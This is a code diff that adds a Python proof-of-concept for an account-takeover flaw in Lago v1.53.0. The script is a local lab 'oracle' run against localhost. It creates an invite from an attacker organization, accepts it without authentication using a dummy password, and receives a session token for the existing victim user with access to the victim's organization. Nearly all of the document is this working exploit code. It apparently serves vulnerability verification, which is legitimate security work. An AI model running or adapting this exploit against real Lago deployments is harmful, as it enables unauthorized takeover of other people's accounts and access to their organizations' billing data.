@@ -222,21 +222,279 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-"""Lago v1.53.0 acceptInvite cross-org ATO. Loopback lab client."""
+"""Local GraphQL oracle for Lago v1.53.0 acceptInvite ATO.
 
+Does not touch a mailbox. Does not change the victim password.
+Witness last line: SUCCESS LAGO-INVITE-ATO ...
+"""
+
+import json
 import os
-import subprocess
 import sys
-from pathlib import Path
+import urllib.error
+import urllib.request
+import uuid
+from dataclasses import dataclass
+from typing import Any, NoReturn
 
-HERE = Path(__file__).resolve().parent
-LAB = HERE / "lab"
+DEFAULT_API = "http://127.0.0.1:13000"
+GRAPHQL_PATH = "/graphql"
+HTTP_TIMEOUT_S = 30
+LABEL = "LAGO-INVITE-ATO"
+VICTIM_PASSWORD = "ILoveLago-Victim-1"
+ATTACKER_PASSWORD = "ILoveLago-Attacker-1"
+DUMMY_PASSWORD = "this-password-is-not-the-victim-password"
+
+REGISTER = """
+mutation($input: RegisterUserInput!) {
+  registerUser(input: $input) {
+    token
+    user { id email }
+    organization { id name }
+  }
+}
+"""
+
+LOGIN = """
+mutation($input: LoginUserInput!) {
+  loginUser(input: $input) {
+    token
+    user { id email organizations { id name } }
+  }
+}
+"""
+
+CREATE_INVITE = """
+mutation($input: CreateInviteInput!) {
+  createInvite(input: $input) {
+    id
+    token
+    email
+    roles
+  }
+}
+"""
+
+ACCEPT = """
+mutation($input: AcceptInviteInput!) {
+  acceptInvite(input: $input) {
+    token
+    user { id email }
+  }
+}
+"""
+
+ME = """
+query {
+  currentUser {
+    id
+    email
+    organizations { id name }
+  }
+}
+"""
+
+ORG = """
+query {
+  organization { id name }
+}
+"""
+
+
+@dataclass(frozen=True)
+class LabConfig:
+    api: str
+    suffix: str
+
+    @property
+    def graphql_url(self) -> str:
+        return f"{self.api.rstrip('/')}{GRAPHQL_PATH}"
+
+    @property
+    def victim_email(self) -> str:
+        return f"victim-{self.suffix}@lab.local"
+
+    @property
+    def victim_org(self) -> str:
+        return f"Victim Corp {self.suffix}"
+
+    @property
+    def attacker_email(self) -> str:
+        return f"attacker-{self.suffix}@lab.local"
+
+    @property
+    def attacker_org(self) -> str:
+        return f"Attacker Corp {self.suffix}"
+
+
+def fail(reason: str) -> NoReturn:
+    print(f"FAIL {reason}")
+    raise SystemExit(1)
+
+
+def load_config(argv: list[str]) -> LabConfig:
+    api = argv[1] if len(argv) > 1 else DEFAULT_API
+    suffix = os.environ.get("LAGO_POC_SUFFIX") or uuid.uuid4().hex[:8]
+    return LabConfig(api=api, suffix=suffix)
+
+
+def gql(
+    url: str,
+    query: str,
+    variables: dict[str, Any] | None = None,
+    token: str | None = None,
+    org: str | None = None,
+) -> dict[str, Any]:
+    body = json.dumps({"query": query, "variables": variables or {}}).encode("utf-8")
+    headers = {"Content-Type": "application/json"}
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+    if org:
+        headers["x-lago-organization"] = org
+    request = urllib.request.Request(url, data=body, headers=headers, method="POST")
+    try:
+        with urllib.request.urlopen(request, timeout=HTTP_TIMEOUT_S) as response:
+            payload: Any = json.loads(response.read().decode("utf-8"))
+    except urllib.error.HTTPError as exc:
+        raw = exc.read().decode("utf-8", "replace")
+        fail(f"http {exc.code} {raw[:500]}")
+    if not isinstance(payload, dict):
+        fail(f"non-object graphql response {str(payload)[:800]}")
+    return payload
+
+
+def require_path(payload: dict[str, Any], *path: str) -> Any:
+    current: Any = payload.get("data") or {}
+    for key in path:
+        if not isinstance(current, dict) or key not in current:
+            fail(f"missing {'/'.join(path)} in {json.dumps(payload)[:800]}")
+        current = current[key]
+    return current
+
+
+def register_user(
+    url: str,
+    email: str,
+    password: str,
+    organization_name: str,
+    who: str,
+) -> dict[str, Any]:
+    payload = gql(
+        url,
+        REGISTER,
+        {
+            "input": {
+                "email": email,
+                "password": password,
+                "organizationName": organization_name,
+            }
+        },
+    )
+    if payload.get("errors"):
+        fail(f"register {who} {json.dumps(payload['errors'])[:800]}")
+    return payload
 
 
 def main() -> int:
-    os.chdir(LAB)
-    result = subprocess.run(["bash", str(LAB / "run.sh"), *sys.argv[1:]], check=False)
-    return int(result.returncode)
+    cfg = load_config(sys.argv)
+    url = cfg.graphql_url
+    print(f"IOC graphql={url}")
+    print(f"IOC suffix={cfg.suffix} victim_email={cfg.victim_email}")
+
+    victim = register_user(
+        url, cfg.victim_email, VICTIM_PASSWORD, cfg.victim_org, "victim"
+    )
+    victim_org = require_path(victim, "registerUser", "organization", "id")
+    victim_user = require_path(victim, "registerUser", "user", "id")
+    print(f"IOC victim_org={victim_org} victim_user={victim_user}")
+
+    attacker = register_user(
+        url, cfg.attacker_email, ATTACKER_PASSWORD, cfg.attacker_org, "attacker"
+    )
+    attacker_token = require_path(attacker, "registerUser", "token")
+    attacker_org = require_path(attacker, "registerUser", "organization", "id")
+    print(f"IOC attacker_org={attacker_org}")
+
+    invite = gql(
+        url,
+        CREATE_INVITE,
+        {"input": {"email": cfg.victim_email, "roles": ["finance"]}},
+        token=attacker_token,
+        org=attacker_org,
+    )
+    if invite.get("errors"):
+        fail(f"createInvite {json.dumps(invite['errors'])[:800]}")
+    invite_token = require_path(invite, "createInvite", "token")
+    print(f"IOC invite_token_len={len(invite_token)}")
+
+    # Unauthenticated accept. Dummy password. No mailbox.
+    accepted = gql(
+        url,
+        ACCEPT,
+        {
+            "input": {
+                "email": cfg.victim_email,
+                "password": DUMMY_PASSWORD,
+                "token": invite_token,
+            }
+        },
+    )
+    if accepted.get("errors"):
+        fail(f"acceptInvite {json.dumps(accepted['errors'])[:800]}")
+    ato_token = require_path(accepted, "acceptInvite", "token")
+    ato_user = require_path(accepted, "acceptInvite", "user", "id")
+    ato_email = require_path(accepted, "acceptInvite", "user", "email")
+    print(f"IOC accept_user={ato_user} accept_email={ato_email}")
+
+    if ato_user != victim_user:
+        fail("acceptInvite minted a different user than the existing victim")
+    if ato_email != cfg.victim_email:
+        fail("acceptInvite email mismatch")
+
+    me = gql(url, ME, token=ato_token)
+    if me.get("errors"):
+        fail(f"currentUser {json.dumps(me['errors'])[:800]}")
+    orgs = require_path(me, "currentUser", "organizations")
+    org_ids = {item["id"] for item in orgs}
+    org_names = {item["name"] for item in orgs}
+    print(f"IOC orgs={sorted(org_names)}")
+
+    if victim_org not in org_ids:
+        fail("victim org missing from ATO JWT organizations")
+    if attacker_org not in org_ids:
+        fail("attacker org missing (invite membership not attached)")
+
+    switched = gql(url, ORG, token=ato_token, org=victim_org)
+    if switched.get("errors"):
+        fail(f"organization switch {json.dumps(switched['errors'])[:800]}")
+    switched_name = require_path(switched, "organization", "name")
+    if switched_name != cfg.victim_org:
+        fail(f"switched org name={switched_name}")
+    print(f"IOC switched_org={switched_name}")
+
+    # Victim password must still work; dummy password from accept must not.
+    bad_login = gql(
+        url,
+        LOGIN,
+        {"input": {"email": cfg.victim_email, "password": DUMMY_PASSWORD}},
+    )
+    if not bad_login.get("errors"):
+        fail("dummy password logged in as victim (password was overwritten)")
+    print("IOC victim_password_unchanged")
+
+    good_login = gql(
+        url,
+        LOGIN,
+        {"input": {"email": cfg.victim_email, "password": VICTIM_PASSWORD}},
+    )
+    if good_login.get("errors"):
+        fail(f"victim real password rejected {json.dumps(good_login['errors'])[:800]}")
+    print("IOC victim_real_password_still_works")
+
+    print(
+        f"SUCCESS {LABEL} acceptInvite JWT is existing victim; lists {cfg.victim_org}; no inbox"
+    )
+    return 0
 
 
 if __name__ == "__main__":
